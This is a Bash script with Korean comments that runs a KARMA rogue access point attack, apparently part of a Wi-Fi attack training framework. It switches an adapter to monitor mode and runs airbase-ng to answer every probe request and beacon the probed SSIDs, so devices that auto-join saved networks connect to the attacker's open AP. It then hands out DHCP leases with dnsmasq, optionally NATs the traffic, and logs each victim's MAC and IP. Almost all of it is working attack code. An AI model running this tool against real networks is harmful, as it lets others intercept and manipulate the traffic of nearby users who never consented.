#!/usr/bin/env bash
# ============================================================
# et_karma_attack.sh - KARMA 공격 (airbase-ng -P: 모든 Probe 응답)
#
#   클라이언트는 과거에 접속했던 네트워크(PNL)를 directed probe 로 계속 묻는다.
#   KARMA AP 는 "그 SSID 여기 있다" 고 어떤 요청에도 응답(-P)하여, 자동 연결로
#   설정된 기기가 공격자의 Open AP(at0)에 그대로 붙게 만든다.
#
#   핵심 도구: airbase-ng (-P 모든 probe 응답, -C probe된 SSID 비컨)
#   보조    : dnsmasq(DHCP) + 선택적 NAT → 클라이언트가 실제로 IP 를 받고 붙음
#
# 사용 예:
#   sudo bash karma/et_karma_attack.sh
#   sudo KARMA_ESSID="Cafe_Free" KARMA_CHANNEL=6 bash karma/et_karma_attack.sh
#   sudo interface=wlan1 bash karma/et_karma_attack.sh     # 공격 어댑터 직접 지정
#   sudo KARMA_NAT=0 bash karma/et_karma_attack.sh          # 인터넷 공유(NAT) 끄기
#
# 종료: Ctrl+C (airbase/dnsmasq 종료 + 인터페이스/NAT 복구 + attack_stop 기록)
# ============================================================
set -u

_script_dir="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
# et_config.conf / et_logger.sh 는 스크립트와 같은 폴더 또는 상위(프로젝트 루트)에 있다.
[ -f "${_script_dir}/et_config.conf" ] || _script_dir="${_script_dir}/.."
_config_file="${_script_dir}/et_config.conf"

# --- 설정 로드 (CRLF 제거 후 source) ---
_cli_interface="${interface:-}"
if [ -f "${_config_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_config_file}")
fi
[ -n "${_cli_interface}" ] && interface="${_cli_interface}"

# --- 파라미터 (env 로 덮어쓰기 가능) ---
KARMA_ESSID="${KARMA_ESSID:-Free_WiFi}"                 # 기본 비컨 ESSID (probe 응답은 어떤 SSID든)
KARMA_CHANNEL="${KARMA_CHANNEL:-${channel:-6}}"         # 채널 (config channel > 기본 6)
KARMA_BEACON_SEC="${KARMA_BEACON_SEC:-30}"              # -C: probe된 SSID 를 비컨하는 주기(초)
KARMA_AP_IP="${KARMA_AP_IP:-10.0.0.1}"                  # at0 게이트웨이 IP
KARMA_DHCP_START="${KARMA_DHCP_START:-10.0.0.50}"
KARMA_DHCP_END="${KARMA_DHCP_END:-10.0.0.150}"
KARMA_NETMASK="${KARMA_NETMASK:-255.255.255.0}"
KARMA_DNS="${KARMA_DNS:-8.8.8.8,1.1.1.1}"
KARMA_NAT="${KARMA_NAT:-1}"                             # 1 이면 uplink 로 인터넷 공유(NAT)
KARMA_UPLINK="${KARMA_UPLINK:-${internet_interface:-}}" # NAT 업링크 (없으면 자동 감지)

# --- 로거 준비 (log_dir 은 bridge 의 WFSAT_LOG_DIR 과 맞춘다) ---
log_dir="${WFSAT_LOG_DIR:-${log_dir:-/tmp/et_logs}}"
tmpdir="$(mktemp -d)/"
_logger_file="${_script_dir}/et_logger.sh"
if [ -f "${_logger_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_logger_file}")
fi

# --- root 확인 ---
if [ "$(id -u 2>/dev/null || echo 1)" != "0" ]; then
	echo "[!] Root 권한이 필요합니다. sudo 로 실행하세요." >&2
	exit 1
fi

# --- 필수 도구 ---
for _bin in airbase-ng dnsmasq iw ip; do
	if ! command -v "${_bin}" > /dev/null 2>&1; then
		echo "[!] '${_bin}' 를 찾을 수 없습니다.  Install: sudo apt update && sudo apt install -y aircrack-ng dnsmasq iw" >&2
		exit 1
	fi
done
if [ "${KARMA_NAT}" = "1" ] && ! command -v iptables > /dev/null 2>&1; then
	echo "[!] iptables 가 없어 NAT 를 끕니다 (KARMA_NAT=0)." >&2
	KARMA_NAT=0
fi

# --- 인터페이스 자동 배정(대화형 없음): 2번째 무선 어댑터 우선, 하나뿐이면 그거 ---
if [ -z "${interface:-}" ]; then
	declare -a _wifaces=()
	for _d in /sys/class/net/*/; do
		_nm=$(basename "${_d}")
		[ -d "/sys/class/net/${_nm}/wireless" ] && _wifaces+=("${_nm}")
	done
	echo "[*] 감지된 무선 어댑터(순서대로): ${_wifaces[*]:-(없음)}"
	if [ "${#_wifaces[@]}" -eq 0 ]; then
		echo "[!] 무선 인터페이스를 찾을 수 없습니다." >&2
		exit 1
	elif [ "${#_wifaces[@]}" -eq 1 ]; then
		interface="${_wifaces[0]}"
	else
		interface="${_wifaces[1]}"
	fi
	echo "[*] KARMA 인터페이스 자동 선택: ${interface}"
fi

if [ ! -d "/sys/class/net/${interface}/wireless" ]; then
	echo "[!] '${interface}' 는 무선 인터페이스가 아닙니다." >&2
	exit 1
fi

# --- NAT 업링크 자동 감지 (지정이 없을 때) ---
if [ "${KARMA_NAT}" = "1" ] && [ -z "${KARMA_UPLINK}" ]; then
	KARMA_UPLINK=$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')
	if [ -z "${KARMA_UPLINK}" ]; then
		echo "[*] 업링크를 찾지 못해 인터넷 공유 없이 실행합니다 (NAT 끔)."
		KARMA_NAT=0
	else
		echo "[*] NAT 업링크 자동 감지: ${KARMA_UPLINK}"
	fi
fi

# --- 상태/정리용 전역 ---
_at0="at0"
_airbase_pid=""
_dnsmasq_pid=""
_xlate_pid=""
_nat_applied=0
_dnsmasq_conf="${tmpdir}dnsmasq.conf"
_dnsmasq_log="${tmpdir}dnsmasq.log"
_airbase_log="${tmpdir}airbase.log"
_ipfwd_old=""

# --- 정리(트랩) ---
_cleanup() {
	echo
	echo "[*] KARMA 공격 종료 중…"
	# 백그라운드 구성요소 종료
	[ -n "${_xlate_pid}" ] && kill "${_xlate_pid}" 2>/dev/null
	[ -n "${_dnsmasq_pid}" ] && kill "${_dnsmasq_pid}" 2>/dev/null
	[ -n "${_airbase_pid}" ] && kill "${_airbase_pid}" 2>/dev/null

	# NAT/포워딩 복구
	if [ "${_nat_applied}" -eq 1 ]; then
		iptables -t nat -D POSTROUTING -o "${KARMA_UPLINK}" -j MASQUERADE 2>/dev/null
		iptables -D FORWARD -i "${KARMA_UPLINK}" -o "${_at0}" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
		iptables -D FORWARD -i "${_at0}" -o "${KARMA_UPLINK}" -j ACCEPT 2>/dev/null
		[ -n "${_ipfwd_old}" ] && echo "${_ipfwd_old}" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
	fi

	# 인터페이스 managed 모드 복구
	ip link set "${interface}" down > /dev/null 2>&1
	iw "${interface}" set type managed > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
	command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed yes > /dev/null 2>&1

	# attack_stop 기록 + 최종 summary
	if command -v log_finalize > /dev/null 2>&1; then
		log_finalize 2>/dev/null || true
	fi
	rm -rf "${tmpdir}" 2>/dev/null
	echo "[+] 정리 완료."
}
trap _cleanup EXIT INT TERM

# --- 모니터 모드 전환 ---
echo "[*] '${interface}' 를 monitor 모드로 전환합니다 (채널 ${KARMA_CHANNEL})…"
command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed no > /dev/null 2>&1
ip link set "${interface}" down > /dev/null 2>&1
iw "${interface}" set type monitor > /dev/null 2>&1
ip link set "${interface}" up > /dev/null 2>&1
iw dev "${interface}" set channel "${KARMA_CHANNEL}" > /dev/null 2>&1
_mode=$(iw "${interface}" info 2>/dev/null | awk '/type/{print $2}')
if [ "${_mode}" != "monitor" ]; then
	echo "[!] ${interface} 를 monitor 모드로 전환하지 못했습니다. (sudo airmon-ng check kill 필요할 수 있음)" >&2
	exit 1
fi

# --- KARMA AP 실행: 모든 probe 에 응답(-P), probe된 SSID 를 비컨(-C) ---
echo "[*] KARMA AP 시작: airbase-ng -P -C ${KARMA_BEACON_SEC} -c ${KARMA_CHANNEL} -e '${KARMA_ESSID}' ${interface}"
airbase-ng -P -C "${KARMA_BEACON_SEC}" -c "${KARMA_CHANNEL}" -e "${KARMA_ESSID}" "${interface}" \
	> "${_airbase_log}" 2>&1 &
_airbase_pid=$!

# at0 가 생길 때까지 대기 (최대 ~10초)
_waited=0
while [ ! -d "/sys/class/net/${_at0}" ]; do
	if ! kill -0 "${_airbase_pid}" 2>/dev/null; then
		echo "[!] airbase-ng 가 조기 종료했습니다. 로그:" >&2
		sed 's/^/    /' "${_airbase_log}" >&2
		exit 1
	fi
	sleep 1
	_waited=$(( _waited + 1 ))
	if [ "${_waited}" -ge 10 ]; then
		echo "[!] '${_at0}' 인터페이스가 생성되지 않았습니다." >&2
		exit 1
	fi
done
echo "[+] 가짜 AP 인터페이스 생성됨: ${_at0}"

# --- at0 에 IP 부여 ---
ip link set "${_at0}" up > /dev/null 2>&1
ip addr add "${KARMA_AP_IP}/24" dev "${_at0}" > /dev/null 2>&1

# --- dnsmasq(DHCP) 설정 및 실행 (시스템 dnsmasq 와 충돌 안 나게 단독 실행) ---
{
	echo "port=0"                                   # DNS 끔(DHCP만) → 포트 53 충돌 방지
	echo "interface=${_at0}"
	echo "bind-interfaces"
	echo "dhcp-range=${KARMA_DHCP_START},${KARMA_DHCP_END},${KARMA_NETMASK},12h"
	echo "dhcp-option=3,${KARMA_AP_IP}"             # gateway
	echo "dhcp-option=6,${KARMA_DNS}"               # DNS
	echo "dhcp-leasefile=${tmpdir}dnsmasq.leases"
	echo "log-dhcp"
} > "${_dnsmasq_conf}"

echo "[*] dnsmasq(DHCP) 시작: ${_at0}…"
dnsmasq --conf-file="${_dnsmasq_conf}" --no-daemon > "${_dnsmasq_log}" 2>&1 &
_dnsmasq_pid=$!
sleep 1
if ! kill -0 "${_dnsmasq_pid}" 2>/dev/null; then
	echo "[!] dnsmasq 실행 실패. 로그:" >&2
	sed 's/^/    /' "${_dnsmasq_log}" >&2
	echo "    (시스템 dnsmasq 서비스가 떠 있으면: sudo systemctl stop dnsmasq)" >&2
	exit 1
fi

# --- (선택) NAT: 클라이언트에게 인터넷 제공 ---
if [ "${KARMA_NAT}" = "1" ] && [ -n "${KARMA_UPLINK}" ]; then
	echo "[*] NAT 활성화: ${_at0} -> ${KARMA_UPLINK}"
	_ipfwd_old=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
	echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
	iptables -t nat -A POSTROUTING -o "${KARMA_UPLINK}" -j MASQUERADE 2>/dev/null
	iptables -A FORWARD -i "${KARMA_UPLINK}" -o "${_at0}" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
	iptables -A FORWARD -i "${_at0}" -o "${KARMA_UPLINK}" -j ACCEPT 2>/dev/null
	_nat_applied=1
else
	echo "[*] NAT 꺼짐: 클라이언트는 IP 는 받지만 인터넷은 안 됩니다."
fi

# --- dnsmasq DHCPACK 로그를 기존 로거가 읽는 clts.txt 형식으로 변환 ---
#     dnsmasq:  "...DHCPACK(at0) 10.0.0.52 aa:bb:cc:dd:ee:ff hostname"
#     변환후  :  "DHCPACK on 10.0.0.52 to aa:bb:cc:dd:ee:ff"  (et_logger 가 기대하는 포맷)
: > "${tmpdir}clts.txt"
(
	tail -n0 -F "${_dnsmasq_log}" 2>/dev/null | while IFS= read -r _line; do
		if [[ "${_line}" =~ DHCPACK\([^\)]+\)[[:space:]]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]+([0-9a-fA-F:]+) ]]; then
			echo "DHCPACK on ${BASH_REMATCH[1]} to ${BASH_REMATCH[2]}" >> "${tmpdir}clts.txt"
		fi
	done
) &
_xlate_pid=$!

# --- 로그 시작 (대시보드 실습 탭 연동) ---
essid="${KARMA_ESSID}"
bssid="(karma · 모든 SSID 에 응답)"
et_dos_attack="KARMA"
channel="${KARMA_CHANNEL}"
if command -v log_init > /dev/null 2>&1; then
	log_init
fi
# clts.txt 를 감시해 client_connected 이벤트 + 클라이언트 수를 기록(기존 로거 재사용)
if command -v log_start_dhcp_monitor > /dev/null 2>&1; then
	log_start_dhcp_monitor
fi

echo "[+] KARMA 실행 중. 저장된 네트워크를 찾는 기기에 응답해 자동 연결을 유도합니다."
echo "    (종료하려면 Ctrl+C)"

# --- 메인 루프: airbase 가 살아있는 동안 상태 갱신 ---
while kill -0 "${_airbase_pid}" 2>/dev/null; do
	if command -v _log_update_summary > /dev/null 2>&1; then
		_log_update_summary 2>/dev/null || true
	fi
	sleep 5
done
